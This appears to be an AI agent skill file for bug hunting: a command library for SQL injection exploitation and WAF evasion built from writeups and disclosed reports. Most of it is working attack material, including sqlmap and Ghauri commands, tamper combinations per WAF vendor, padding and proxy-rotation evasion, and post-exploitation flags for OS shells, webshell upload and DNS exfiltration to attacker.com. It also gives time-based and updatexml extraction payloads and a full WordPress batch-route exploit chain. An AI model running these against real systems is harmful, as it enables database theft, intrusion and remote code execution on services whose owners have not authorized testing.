---
name: sqli-waf-bypass-testing
description: SQL injection exploitation and WAF-evasion technique library for sqlmap and Ghauri — tamper script combinations mapped to specific WAF vendors (Cloudflare, Imperva, Akamai, F5, Fortinet, etc.), WAF body-size-limit exhaustion, origin-IP discovery to bypass the WAF entirely, and dual-tool (sqlmap + Ghauri) strategy. Use this during Phase 3 (Vulnerability Testing — Injection) of bughunting-workflow whenever a SQLi candidate parameter is blocked by a WAF, a 403/406 response appears on an otherwise-promising injection point, or the target sits behind a known WAF vendor. Also trigger on mentions of sqlmap, Ghauri, tamper script, WAF bypass, ModSecurity, Cloudflare WAF, origin IP, or SQL injection.
---

# SQLi Exploitation & WAF Bypass (sqlmap / Ghauri)

Command-reference and technique library for getting SQLi payloads past a WAF, not just detecting SQLi on an unprotected target. Each dated entry is pulled from a real writeup — extend this file (don't create a duplicate skill) when a new source adds a different tamper combo, evasion trick, or tool.

## Core theory

A WAF-blocked SQLi finding is not a dead end — it means the payload's *signature* was recognized, not that the underlying injection doesn't exist. Three independent angles to try, roughly in order of effort:

1. **Obfuscate the payload** so it no longer matches the WAF's signature (tamper scripts) — cheapest, try first.
2. **Exceed the WAF's inspection limits** so it never even looks at the payload (oversized request body).
3. **Route around the WAF entirely** (hit the origin server directly, or via a proxy chain with reputation-clean IPs).

Always run both **sqlmap** and **Ghauri** against a candidate — they use different detection/extraction logic and each finds injections the other misses. Ghauri in particular adapts its timing/extraction logic per-request, which evades behavior-based WAFs that block fixed payload patterns; sqlmap's tamper-script system is the stronger tool for signature-based WAFs.

**Don't stack too many tamper scripts at once** — long combined payloads are themselves a WAF trigger, cause script conflicts, and produce false positives/slower scans. Pick the 2-4 scripts matched to the actual WAF vendor in front of the target (fingerprint it first via response headers/error pages/`wafw00f`), not a kitchen-sink combo.

## Recorded technique: sqlmap + Ghauri command reference
Source: [Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques](https://medium.com/bugbountywriteup/mastering-sqlmap-and-ghauri-a-practical-guide-to-waf-bypass-techniques-1aaa9eee9d32)

### sqlmap — basic detection & enumeration
```bash
sqlmap -u "vulnerable_url" --dbs --batch
sqlmap -r request.txt --level 5 --risk 3 --batch --dbs
sqlmap -m urls.txt --batch --random-agent --tamper=space2comment \
  --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
sqlmap -u 'vulnerable_url' --data '{"User":"admin","Pwd":"admin@123"}' \
  --random-agent --ignore-code 403 --dbs --hex
sqlmap -u https://target.com/registration --dbs --forms --crawl=2 --batch
```

### sqlmap — enumeration & data extraction
```bash
--dbs                                    # list all databases
-D database_name --tables                # list tables
-D database_name -T table_name --columns # list columns
-D database_name -T table_name -C col1,col2 --dump  # extract specific columns
--dump-all --threads=10                  # dump everything, parallelized
--hex --no-cast                          # hex-encode output, disable type casting (avoids mangled data)
```

### sqlmap — auth/session/header handling
```bash
--cookie="PHPSESSID=..."               # maintain an authenticated session
--headers="X-Forwarded-For: 127.0.0.1" # spoof trusted-origin header (also see recon-scanning-toolkit header tricks)
--csrf-token=token
--random-agent
--headers="X-Original-URL: /vuln.php"  # bypass reverse-proxy/WAF routing to a different backend path
--method=PUT
--param-del=";"                        # custom parameter delimiter, can itself confuse WAF parsing
```

### sqlmap — post-exploitation (OS/file access)
```bash
--os-shell                              # interactive OS command shell
--os-pwn                                # full system takeover (Metasploit integration)
--file-read=/etc/passwd
--file-write=shell.php --file-dest=/var/www/html/shell.php
--dns-domain=attacker.com               # out-of-band DNS exfiltration
--os-shell --technique=O                # out-of-band command shell
```

### sqlmap — timing/stealth
```bash
--delay=5 --timeout=20 --retries=5 --threads=1   # slow, single-threaded, stealthy
--tor --tor-type=SOCKS5                          # route via Tor
--proxy https://127.0.0.1:8080                   # route through Burp for manual inspection
```

### sqlmap — tamper scripts mapped to WAF vendor
Pick the row matching the fingerprinted WAF, don't combine rows:
| Target WAF | Tamper combo |
|---|---|
| ModSecurity, Cloudflare, F5 ASM | `--tamper=between,randomcase,space2comment` |
| Imperva SecureSphere | `--tamper=space2comment,space2morehash` |
| Comodo WAF | `--tamper=modsecurityversioned,space2comment` |
| Cloudflare, Akamai, Sucuri | `--tamper=space2comment,between,randomcase,charencode` |
| PHP WAFs, Wordfence | `--tamper=space2comment,randomcase,unmagicquotes` |
| Imperva, Barracuda | `--tamper=space2comment,between,percentage` |
| Cloudflare, F5 ASM, Radware | `--tamper=charencode,randomcase,space2comment` |
| Akamai, Sucuri, StackPath | `--tamper=space2plus,space2comment,randomcase` |
| ModSecurity, Comodo | `--tamper=between,space2comment,modsecurityzeroversioned` |
| Imperva, Cloudflare | `--tamper=space2comment,randomcase,apostrophemask` |
| Akamai, Radware, Azure WAF | `--tamper=charunicodeencode,space2comment,randomcase` |
| BlueCoat/Symantec | `--tamper=space2comment,between,randomcase,bluecoat` |
| F5 ASM, Citrix NetScaler | `--tamper=space2comment,between,randomcase,equaltolike` |
| FortiWeb, legacy ModSecurity | `--tamper=space2comment,randomcase,overlongutf8` |

Additional evasion flags to layer on top: `--ignore-code=401,403,500` (don't treat a block response as "not injectable"), `--hex`, `--keep-alive`, `--null-connection`, `--force-ssl`, `--no-cast`.

### Ghauri — command reference
```bash
ghauri -u "vulnerable_url" --dbs --batch
ghauri -r request.txt -p txt_user_id --dbs --batch --level 3
ghauri -m urls.txt --batch --dbs --level 3 --threads 10
ghauri -u 'vulnerable_url' --data '{"User":"test","Pwd":"test@123"}' \
  --random-agent --dbs --level 3 --batch
# WAF bypass with timing adaptation (time-based blind)
ghauri -u 'vulnerable_url' --batch --dbs --level 3 --dbms mysql \
  --tech=T --confirm --time-sec 10 --delay 5
# via proxy chain
proxychains ghauri -u "vulnerable_url" -p param --batch --dbs \
  --confirm --level 3 --time-sec 10
```
Ghauri-specific flags: `--prefix "')/**/"` / `--suffix "--+"` (custom payload wrapping when the injection context needs a specific closing sequence), `--skip-urlencode`, `--confirm` (re-validates each payload before exploiting — cuts false positives).

**Fortinet WAF bypass via junk-data padding (Ghauri):**
```bash
ghauri --data "junk=[1024+ characters of junk data]&recover=1&user=admin*" \
  --url https://target.com/login.php --dbs --batch -D MAIN -T USERS --dump
```
Padding the request body past the WAF's inspection size with junk lets the real payload (`user=admin*`) ride through unexamined — a manual, single-request version of the body-size-limit technique below.

## Recorded technique: WAF body-inspection size limits (exploitable)
Source: same article as above.

Most WAFs only inspect the first N bytes/KB of a request body for performance reasons. Pad the request past that limit and the injection payload lands after the inspected window.

| WAF provider | Max inspection size |
|---|---|
| Cloudflare | 128 KB (ruleset), up to 500 MB (Enterprise) |
| AWS WAF | 8–64 KB (configurable) |
| Akamai | 8–128 KB |
| Azure WAF | 128 KB |
| FortiWeb | 100 MB |
| Barracuda | 64 KB |
| Sucuri | 10 MB |
| Radware AppWall | up to 1 GB |
| F5 BIG-IP | 20 MB (configurable) |
| Palo Alto | 10 MB |
| Google Cloud Armor | 8 KB (increasable to 128 KB) |

**Exploit steps:** identify the WAF vendor (response headers, block-page fingerprint), pad a POST body with junk data past its listed inspection limit, place the actual SQLi payload in a field positioned after that limit. Small-limit WAFs (AWS 8KB, Azure/Cloudflare 128KB, Google Cloud Armor 8KB default) are the easiest targets for this.

## Recorded technique: routing around the WAF entirely
Source: same article as above.

- **Origin IP discovery:** find the real backend server IP and bypass the WAF/CDN layer in front of it entirely, then re-run sqlmap/Ghauri against the domain (for correct `Host`/SNI/vhost matching) while your traffic physically routes to the origin. See `waf-origin-ip-discovery-testing` for the full multi-source discovery methodology (Shodan cert search, Censys, SecurityTrails, favicon-hash pivoting, VirusTotal/AlienVault) and origin-verification steps (hosts-file test, nmap cert match, ruling out the "redirects back to CDN" false positive) — that skill isn't SQLi-specific, it's the general WAF-bypass-via-origin-IP primitive.
- **Residential-IP proxy chains:** `proxychains sqlmap [...]` through residential IPs evades reputation-based WAF blocking that flags known datacenter/VPN/Tor IP ranges — more effective than Tor for WAFs that specifically blocklist Tor exit nodes. See "Recorded technique: proxychains residential-proxy setup + Cloudflare command" below for the exact config.
- **DBMS-specific payloads:** always pass `--dbms mysql`/`postgresql`/`mssql` once you know the backend — engine-specific payloads are both more precise and less likely to trip generic multi-DBMS detection signatures.
- **Risk/level calibration:** `--risk 2 --level 5` for moderate aggression; `--risk 3 --level 5` only when you can tolerate more noise/destructive payload attempts (OR-based, heavier boolean payloads) — use cautiously per program rules.

## Recorded technique: proxychains residential-proxy setup + Cloudflare command
Source: [WAF Bypass Masterclass: Using SQLMap with ProxyChains and Tamper Scripts Against Cloudflare](https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94)

**`/etc/proxychains.conf` setup:**
1. Comment out the default Tor line(s) at the bottom of the file.
2. Add one or more residential proxies, one per line, in this format:
   ```
   http <ipaddress> <port> [username] [password]
   ```
3. Set the chain mode to `random_chain` (not `dynamic_chain`/`strict_chain`) — on a failed proxy, ProxyChains automatically rotates to another entry in the list instead of the whole chain failing.
4. Enable `quiet_mode` to suppress ProxyChains' own connection logging so it doesn't clutter sqlmap's output.

**Validate the config before attacking anything:**
```bash
proxychains curl http://ipinfo.io
proxychains curl http://ipinfo.io/ip
```
Run it a few times — a working random-chain config returns a *different* source IP/location on each run. If every run returns the same IP (or your real IP), the chain isn't actually rotating and needs to be fixed before proceeding.

**Full attack command against a Cloudflare-fronted target:**
```bash
proxychains sqlmap -u 'url' --dbs --batch -p id --random-agent \
  --tamper=between,space2comment --dbms mysql --tech=B --no-cast \
  --flush-session --threads 10
```
`--tech=B` restricts to boolean-based blind detection specifically (quieter/less noisy against WAF pattern-matching than trying every technique at once); `--flush-session` discards any cached session data from a prior run so a stale/blocked session state doesn't skew results; combine with the `between,randomcase,space2comment` Cloudflare row already in the tamper-vendor table above for the full obfuscation+IP-rotation combo.

**Recon-before-attack note:** run Ghauri first as the detection pass, then switch to sqlmap for the full exploitation — the article's own caveat is that automated SQLi detection tools (either one) "are not perfect" and produce false positives, so manually verify a candidate before investing proxy/tamper effort into exploiting it.

## Recorded technique: mass-hunting SQLi candidates at scale
Source: same article as above.

Pipeline for generating a high-confidence candidate-URL list across many targets/subdomains before running the sqlmap+proxychains attack above one-by-one:
```bash
# 1. Historical URL mining filtered to SQLi-shaped parameters, deduplicated
cat urls.txt | waybackurls | gf sqli | uro > new.txt

# 2. One URL per unique domain (host), first-seen-wins — cuts redundant noise
#    before manual triage or before feeding into nuclei/sqlmap at scale
cat urls.txt | gawk -F/ '{host=$3; sub(/:80$/, "", host); \
  if (!(host in seen)) { print $0; seen[host] } }'

# 3. Plain host-list dedup (when you just need unique domains, not full URLs)
cat urls.txt | awk -F/ '{print $3}' | sort -u

# 4. Template-based confirmation pass
nuclei -l urls.txt -t nuclei-templates/dast/sql-injection.yaml
```
`uro` is the key dedup step here — it collapses URLs that differ only in parameter *values* (not structurally different endpoints), so `gf sqli`'s pattern-matched output doesn't waste scan time on near-duplicate URLs hitting the same code path. Domain-level Google dorking (to seed `urls.txt` in the first place) is the same dorking approach already covered in `recon-scanning-toolkit`/`cloud-storage-bucket-testing` — reuse that URL list rather than re-dorking from scratch.

## Impact framing for report

Findings from this chain scale from data exposure to full compromise depending on what's reachable: database enumeration/dumping (PII/credentials), OS command execution (`--os-shell`/`--os-pwn`), arbitrary file read/write (webshell upload via `--file-write`), and out-of-band exfiltration via DNS tunneling when the response channel is blind. Frame severity by the *worst* reachable primitive, not just "SQL injection found" — a blind SQLi that chains to `--os-shell` is a full RCE finding, not a Medium.

## Recorded technique: recon-to-candidate pipeline + multi-DBMS header-based time-based verification
Source: [Mastering SQL Injection Recon: Step-by-Step Guide for Bug Bounty Hunters](https://infosecwriteups.com/mastering-sql-injection-recon-step-by-step-guide-for-bug-bounty-hunters-9f493fb058dd) (author: 𝙇𝙤𝙨𝙩𝙨𝙚𝙘)

Covers the stage *before* the sqlmap/Ghauri attack commands above: going from a bare domain to a filtered candidate-URL list, plus manual time-based confirmation via HTTP headers rather than just the URL parameter.

**Candidate discovery pipeline:**
```bash
# Dynamic-page host filtering
subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

# Parameterized URL collection — two independent sources, merged
echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" > urls.txt
echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" > urls2.txt

# Filter to SQLi-shaped parameters
cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt

# One-liner combined variants
subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
```

**Google dorks to seed candidates directly (skip crawling entirely for a quick pass):**
```
site:*.domain.com inurl:id=
site:*.domain.com ext:php inurl:id=
site:*.domain.com intext:"You have an error in your SQL syntax"
site:*.domain.com intext:"mysql_fetch_array() expects parameter"
site:*.domain.com intext:"Warning: PDO::query()"
site:example.com ext:sql | ext:db
intitle:"index of" "db.sql"
```
Error-message dorks (`intext:"You have an error..."`) find pages that are *already* leaking a raw DB error in production — near-guaranteed injectable and worth prioritizing over blind guessing.

**Header-based time-based confirmation** — the injection point doesn't have to be the URL parameter; test request headers the backend logs or uses for logic (User-Agent, X-Forwarded-For, Referer), since these are frequently unsanitized even when URL parameters are properly escaped:
```bash
time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"
time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"
time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\"" "https://target.com/vulnerable-endpoint"
```
The `XOR(...)XOR'Z` wrapper is a filter-evasion shape distinct from a plain `' OR SLEEP(10)-- -`: it survives naive blacklists that strip the literal string `OR` or `AND` since it uses the `XOR` keyword and closes/reopens the quote context around the sleep call instead of relying on a trailing comment. Confirm with `time` — a ~10s (or whatever delay value was injected) response latency versus a baseline request is the signal, not the response body/status code.

**DBMS-specific time-delay payloads** — swap in the right one once the backend engine is known (or try each in turn when it isn't), since `SLEEP()` only exists in MySQL and a wrong-engine payload silently no-ops instead of erroring:
| DBMS | Sleep payload | Injected form |
|---|---|---|
| MySQL | `SELECT SLEEP(10);` | `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z` |
| PostgreSQL | `SELECT pg_sleep(10);` | `' OR 1=1; SELECT pg_sleep(5);--` |
| MSSQL | `WAITFOR DELAY '00:00:10';` | `'; WAITFOR DELAY '00:00:05'; --` |
| Oracle | `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;` | `' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--` |

Once a DBMS is confirmed this way, pass `--dbms <engine>` to sqlmap/Ghauri (already noted above) to skip their own multi-engine fingerprinting pass and go straight to engine-specific extraction.

**Origin-IP WAF bypass cross-reference:** the article cites a real case (SQLi against Sri Lanka's largest electricity board) bypassed via origin-IP discovery rather than payload obfuscation — same primitive as this file's "routing around the WAF entirely" section; see `waf-origin-ip-discovery-testing` for the full methodology.

## Recorded technique: JS-leaked backend discovery + manual boolean/time-based blind proof + no-sqlmap ROW_NUMBER() extraction (no WAF involved)
Source: [HackerOne report #3778282](https://hackerone.com/reports/3778282) — disclosed report against Essity, Critical (9-10), stacked-query MSSQL injection, bounty hidden

No WAF was present on this target — recorded here anyway because the manual proof-sequence and extraction technique are the same skill regardless of whether a WAF sits in front, and this skill has already grown into the general SQLi command reference (see the recon-to-candidate and header-based entries above). Use this when sqlmap/Ghauri aren't available, aren't desired (quieter footprint), or you want to manually confirm before spending automated-tool cycles.

**Discovery vector — find the backend API before you find the injection:** the in-scope Angular front-end's HTML shell contained an inline `<script>` leaking the true API host directly:
```html
<script>
  window.baseApiUrl = 'https://backend-host/api';
</script>
```
This is a generically useful recon pattern — grep any SPA's rendered/initial HTML for `baseApiUrl`, `apiUrl`, `API_BASE`, `window.__ENV__`, or similar inline-config leaks before assuming the front-end's own domain is the only attack surface; the real backend is frequently a *different* host never linked from the UI. The backend host here also exposed **Swagger UI unauthenticated at its root** (`/index.html`, spec at `/swagger/v2/swagger.json`) — cross-reference `swagger-ui-xss-testing` for that surface's own XSS angle, but here it was simply free API documentation handed to the attacker (endpoint list, expected parameters) with zero recon effort.

**Manual boolean-blind proof sequence** (establish the injection is real and controllable before building an extraction pipeline):
```
# Baseline — no rows
GET /api/WDMProduct?searchText=test
→ HTTP 200, 29 bytes, {"products":[],"labels":null}

# Boolean TRUE — forces every row to match
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--
(decoded: searchText=zzz') OR 1=1--)
→ HTTP 200, 22,911 bytes, 179 rows

# Boolean FALSE — control, same impossible base term
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--
→ HTTP 200, 29 bytes, 0 rows
```
The TRUE/FALSE pair sharing an identical impossible base term (`zzz`) and differing only in `1=1` vs `1=2` is what proves the injected condition — not the application logic — is controlling the result set size. This is the manual equivalent of what sqlmap's boolean-blind technique automates; worth doing by hand first on any candidate to build confidence before automating.

**DBMS fingerprint via a subquery inside the same boolean oracle** — confirms both the injection depth (arbitrary subqueries execute) and the exact engine, using an MSSQL-specific system view:
```
GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--
→ true-branch row count returned (`sys.tables` only exists on SQL Server)
```

**Stacked-query time-based confirmation** — proves stacked queries (`;` separator) are enabled, which is what elevates severity from "read-only blind SQLi" to "arbitrary DDL/DML, potential `xp_cmdshell` RCE":
```
GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--
(decoded: searchText=zzz');WAITFOR DELAY '0:0:6'--)
→ 6.43s elapsed vs ~0.2s baseline
```

**Reconstructing the vulnerable query from oracle behavior** — you don't need source access to infer the backend SQL shape; the exact characters that flip behavior tell you the query structure:
```sql
SELECT productId, productDescription, productDimension, productLayers
FROM dbo.WDMProduct
WHERE (productDescription LIKE '%' + @searchText + '%')
  AND countryCode = ...
```
Reasoning chain: a bare `'` caused a 500 (breaks the `LIKE` string literal), `''` passed through cleanly (valid escaped-quote-adjacent case), and a closing `)` was required in the working payloads (closes a wrapping paren around the `LIKE` clause) — that's how the closing-paren-then-`OR`-then-comment payload shape was derived rather than guessed.

**No-sqlmap manual blind extraction via `ROW_NUMBER()` windowing** — a custom Python script (`extract.py`) did classic binary-search-on-ASCII-value blind extraction (1052 requests / 21.4s for full DB metadata + partial table enumeration), but the technique worth recording is the *pagination* trick used to enumerate rows one at a time on MSSQL, which lacks `LIMIT`/`OFFSET`:
```sql
SELECT name FROM (
  SELECT ROW_NUMBER() OVER(ORDER BY name) AS rn, name
  FROM sys.tables WHERE is_ms_shipped=0
) t WHERE rn=1
```
Increment `rn` per request to walk the row set one-by-one inside a boolean-blind oracle — this is the MSSQL-specific equivalent of MySQL's `LIMIT 1 OFFSET n` for manual blind enumeration, worth reaching for whenever the fingerprinted engine is SQL Server and you're extracting by hand rather than via sqlmap's own `--dbms mssql` handling.

**Impact escalation specific to this chain:** the API additionally had `Access-Control-Allow-Origin: *`. Combined with **unauthenticated** SQLi, that CORS setting means *any* third-party web page can trigger these injected requests from a victim's browser with zero interaction beyond a page visit — a watering-hole amplification of the SQLi itself, not just a CORS finding on its own (cross-reference `cors-misconfig-testing`, though note the exploitation shape here is different: it's amplifying an unauth SQLi's reach, not stealing credentialed responses).

**Impact framing for report:** the reporter explicitly separated "what I actually extracted" (public product-catalog data) from "what the primitive proves" (unauthenticated stacked-query execution against the full SQL principal's privileges) — and argued Critical severity on the latter, not the former: "The stacked-query primitive itself represents critical impact regardless of what data is in the current schema." Use this framing whenever the specific data reachable looks unimpressive but the injection technique (stacked queries, high-privilege SQL principal, potential `xp_cmdshell`) is what actually justifies the rating.

## Recorded technique: WordPress REST batch-endpoint route-desync SQLi + parameter-name WAF bypass via `parse_str()` normalization
Source: [HackerOne report #3873072](https://hackerone.com/reports/3873072) — disclosed report against Essity, "Unauthenticated SQL Injection via REST Batch Route Confusion", CVSS 9.3 Critical, bounty hidden

**Where:** WordPress core's REST API batch endpoint, `/wp-json/batch/v1` (or `/?rest_route=/batch/v1`) — affects WordPress ≤7.0 (fixed 7.0.2+/6.9.5+/6.8.6+). No auth, cookies, or tokens required. Flag this on **every** WordPress recon pass alongside the existing `/xmlrpc.php` check — see `recon-scanning-toolkit`'s WordPress-specific scanning section.

**Root cause — two WordPress-core bugs chained together:**
1. **Batch dispatch index desync**: when a sub-request's path fails `parse_url()`, the error result isn't pushed into the internal `$matches` array, but the dispatch loop's index still increments. The effect: sub-request *N* ends up executing with the handler that was actually registered for sub-request *N+1* — a classic off-by-one route-confusion bug, triggered here by deliberately feeding an invalid path (`":"`) as one of the batch's sub-requests.
2. **Missing type guard on `author__not_in`**: `WP_Query` checks `if (!empty($q['author__not_in']))` but never verifies it's actually an array. A string value arriving via the desynchronized route skips the per-element `absint()` cast entirely and gets concatenated raw into `AND wp_posts.post_author NOT IN ( <attacker-controlled> )`.

Chaining them: nest a *second* batch envelope inside a `POST /wp/v2/categories` request body. The inner sub-requests get re-dispatched with shifted handlers because of bug #1, which makes an otherwise-harmless `GET /wp/v2/categories?author_exclude=<payload>` sub-request actually execute as a **posts query**, with the string value flowing unsanitized into the SQL clause via bug #2.

**Exploit steps:**
1. **Version fingerprint** (public, unauthenticated):
   ```bash
   curl -s "https://target/feed/" | grep '<generator>'
   # → <generator>https://wordpress.org/?v=7.0</generator>
   ```
2. **Structural confirmation** — a *non-destructive* benign-value request (`author_exclude=1`) that proves the route-dispatch desync without injecting anything, using a nested-batch-inside-batch payload:
   ```bash
   curl -s -X POST "https://target/wp-json/batch/v1" -H "Content-Type: application/json" \
     -d '{"validation":"normal","requests":[
       {"path":":","method":"POST"},
       {"path":"/wp/v2/categories","method":"POST","body":{"name":"x","requests":[
         {"path":":","method":"GET"},
         {"path":"/wp/v2/categories?author_exclude=1","method":"GET"},
         {"path":"/wp/v2/posts","method":"GET"}
       ]}},
       {"path":"/batch/v1","method":"POST"}
     ]}'
   ```
   Confirmation signal — a **nested `responses` envelope** (batch-inside-batch) containing `parse_path_failed` markers, with the middle nested sub-request returning real post data (HTTP 200, 10 posts) instead of a normal category-creation response:
   ```
   [0] status=400 code=parse_path_failed          ← invalid path ":" triggers desync
   [1] status=207 → NESTED BATCH ENVELOPE          ← route confusion confirmed
       [0] status=400 code=parse_path_failed
       [1] status=200 → 10 posts returned          ← author_exclude reached the DB as a posts query
       [2] status=500 code=rest_invalid_handler
   [2] status=400 code=rest_batch_not_allowed
   ```
   A **patched** server instead returns a flat, single-level envelope with `rest_cannot_create` — that's the regression-test signature to check when verifying a fix.
3. **Time-based confirmation via the desynced injection point** (`author_exclude=1) OR SLEEP(N)-- -`), using a SLEEP(0) baseline against a SLEEP(0.01) test to prove the delay is real and not network jitter:
   ```
   1) OR SLEEP(0)--  -   → 0.46-0.54s (baseline, SQL parses, zero added delay)
   1) OR SLEEP(0.01)-- - → 9.12s      (~860 matching rows × 0.01s each)
   ```
   The **per-row multiplication** (baseline delta × row count ≈ total observed delay) is worth reasoning through explicitly in a report — it's what proves the `SLEEP()` executes once *per row* inside a `WP_Query` result-set evaluation (i.e. injected into a `WHERE`/`NOT IN` clause evaluated per-row), not just once at the top of the query. Higher `SLEEP()` values (0.3, 3) predictably timed out entirely as the per-row cost compounded — consistent with the same mechanism, not a coincidence.

**Live WAF bypass discovered mid-triage** — after initial submission, the program's Cloudflare-managed ruleset started blocking the literal string `author_exclude` in the POST body (403 "Attention Required"), and the reporter defeated it with a **parameter-name mutation**, not a payload-encoding trick:
```
author_exclude=...   → blocked by WAF (literal string match on the param name)
author.exclude=...   → WAF bypass — same effective parameter
```
Why it works: PHP's `parse_str()` normalizes dots (and spaces, and some other characters) to underscores when parsing form/query data into variable names — so WordPress still receives and interprets `author.exclude` as `author_exclude` internally, but the WAF's rule matched only the literal underscore spelling and never saw it. **Generalize this as a distinct WAF-bypass category** beyond the tamper-script/payload-encoding techniques elsewhere in this skill: when a WAF's managed rule matches on a *parameter name* rather than the payload value, look for any framework-level name-normalization quirk (PHP's dot/space-to-underscore `parse_str()` behavior is the concrete one here; check for equivalent behavior in other frameworks — e.g. Rails' bracket/dot handling — before assuming a blocked parameter name is a dead end).

**Testing-discipline note worth reusing in your own reports:** the reporter explicitly scoped every step as non-destructive — a benign confirmation value (`1`) for the structural-desync proof, a timing oracle (`SLEEP`) rather than a data-extraction payload for the injection proof, and version fingerprinting from public `/feed/` metadata rather than any authenticated probe — then stated plainly "No database content was extracted. No user data or PII was accessed." Stating this explicitly heads off exactly the kind of "please reproduce with more detail" triage friction this report got, and reduces legal/scope risk on programs with strict non-destructive-testing rules.

**Impact framing for report:** walked the chain from raw DB read access to concrete account-takeover primitives by naming the actual WordPress tables reachable — `wp_users` (password hashes → offline cracking → admin takeover), `wp_usermeta` (session tokens, application passwords → direct hijack), `wp_options` (API keys, plugin secrets, site config) — plus a conditional RCE escalation path (`SELECT ... INTO OUTFILE` if the MySQL account holds `FILE` privilege with webroot write access). Naming the specific WordPress-core tables and what each yields is more persuasive to a triager than a generic "can read the database" claim.

## Recorded technique: error-based MySQL SQLi via `updatexml()` on shared auth-workflow parameter (login + password reset)
Source: [HackerOne report #3809973 — Error-Based SQL Injection in Login/Password Reset (username parameter)](https://hackerone.com/reports/3809973) — disclosed report against Essity, Critical (9-10), no CVE, no bounty.

**Where:** the `username` parameter, injectable identically on **two separate endpoints** — `POST /login` and `POST /doResetPassword` — because both flows share the same backend username-lookup code. **Recon takeaway:** once you find an injectable parameter name on one auth endpoint, always retest that exact parameter on every *other* endpoint that also accepts it (login, password reset, registration, "resend verification") rather than treating each endpoint as an independent target — shared backend helper functions make the same injection point reappear across a whole auth workflow.

**Root cause:** the `username` value is concatenated into a SQL query with no parameterization on the auth path specifically — a different (and often less scrutinized) code path than a product-search or listing endpoint, since developers tend to harden "data" queries before "who is this user" lookups.

**Technique — error-based extraction via MySQL's `updatexml()` (distinct from the boolean-blind and time-based blind techniques recorded elsewhere in this skill):** `updatexml(xml_document, xpath_expr, new_value)` throws an XPath syntax error whenever `xpath_expr` isn't a valid XPath location path — and MySQL's error message for that failure includes up to 32 characters of the *offending expression itself*. Wrapping arbitrary attacker-chosen SQL (`concat()`'d with a `~` delimiter so the malformed-XPath error is guaranteed) inside `xpath_expr` means the query's own error response becomes a direct, in-band data-exfiltration channel — no boolean oracle, no timing measurement, just read the error text.

**Exploit steps / exact payloads (`POST /login`, `Content-Type: application/x-www-form-urlencoded`):**
```
# Extract the DB user (proves injection + gives useful recon)
username=' AND updatexml(1,concat(0x7e,user(),0x7e),1) AND '1'='1&password=x

# Extract a table's row count (proves subquery execution, maps schema size)
username=' AND updatexml(1,concat(0x7e,(select cast(count(*) as char) from <table>),0x7e),1) AND '1'='1&password=x
```
Same shape confirmed on the second endpoint (`POST /doResetPassword`) with `version()` in place of `user()`:
```
username=' AND updatexml(1,concat(0x7e,version(),0x7e),1) AND '1'='1&password=x
```
`0x7e` is the hex literal for `~`, used purely as a visible delimiter around the extracted value in the resulting XPath-syntax-error message so it's easy to spot in the response body — swap in any scalar subquery (`(select ... from ... limit 1)`) in place of `user()`/`version()`/`count(*)` to extract arbitrary data one field at a time. The response additionally leaked the full failing SQL query, including schema and table name — a second info-disclosure angle worth calling out separately even though it's a byproduct of the same payload.

**Testing-discipline note worth reusing:** the reporter explicitly stopped at confirming table existence and row count, stating plainly "No user data was extracted beyond confirming table existence and row count" and "No destructive actions were taken" — because the asset itself was arguably outside the program's defined scope. They reported anyway, in good faith, explicitly requesting an "Informative" rating rather than N/A if the program didn't want to accept it. It was accepted, triaged, fixed, and disclosed as Critical (9-10) regardless of the scope ambiguity — a useful data point that a well-documented, responsibly-limited PoC on a borderline-scope asset is often still accepted and fixed rather than closed as N/A, and that minimal, targeted extraction (existence/count, not content) is enough to prove Critical severity without ever touching real user data.

**Verifying a fix — don't trust "no error" alone:** the program's first fix attempt was verified by the reporter re-sending the identical payload and confirming the *distinctive `updatexml()` error output was no longer present* in the response. That's suggestive but weaker than it looks — a fix that merely suppresses/generic-izes error messages (turns a raw DB error into a generic 500) would also make the error text disappear without actually parameterizing the query, leaving the injection exploitable via blind (boolean/time-based) techniques instead. When retesting an "error-based SQLi fixed" claim, follow up with a boolean-blind pair (`' OR 1=1--` vs `' OR 1=2--`, see the other recorded technique in this skill) or a `SLEEP()`-based timing probe before accepting that the underlying query was actually parameterized rather than just having its error output silenced.

**Generalize note:** `updatexml()` (and its sibling `extractvalue()`, same 32-char XPath-error-leak mechanism) is MySQL/MariaDB's fastest manual error-based technique when the application reflects raw DB error text to the client — always try it as a first probe on any suspected MySQL injection point before reaching for a full boolean-blind or time-based sequence, since a single request can confirm and extract data in one shot if error messages are visible at all. If error messages are suppressed, fall back to the boolean-blind/time-based techniques recorded elsewhere in this skill instead.

## Recorded technique: boolean-based blind SQLi in a JSON `sort_by`/`order_by` parameter via injected `CASE WHEN`
Source: [Bug Bounty Recon & Vulnerability Cheat Sheet](https://medium.com/@t4nv1/bug-bounty-recon-vulnerability-cheat-sheet-12d9db390d7f)

